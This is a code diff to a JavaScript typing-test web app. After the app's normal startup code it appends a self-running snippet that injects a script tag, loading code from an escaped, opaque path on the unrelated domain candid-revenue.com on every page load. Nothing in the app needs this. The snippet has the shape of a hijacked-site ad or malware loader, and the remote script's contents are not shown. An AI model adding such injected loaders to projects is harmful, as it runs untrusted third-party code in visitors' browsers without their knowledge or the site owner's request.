@@ -239,3 +239,15 @@ class TypingTest {
 document.addEventListener("DOMContentLoaded", () => {
     new TypingTest();
 });
+
+(function(duwf){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = duwf || {};
+s.src = "\/\/candid-revenue.com\/b.X\/VSsBdSGFle0FYaWNce\/oe\/m\/9HuPZVULlhk\/PETnc\/xFN_TUYW4wNYD\/k\/tGN\/zYEv1\/NQjhgG1NMfwJ";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+
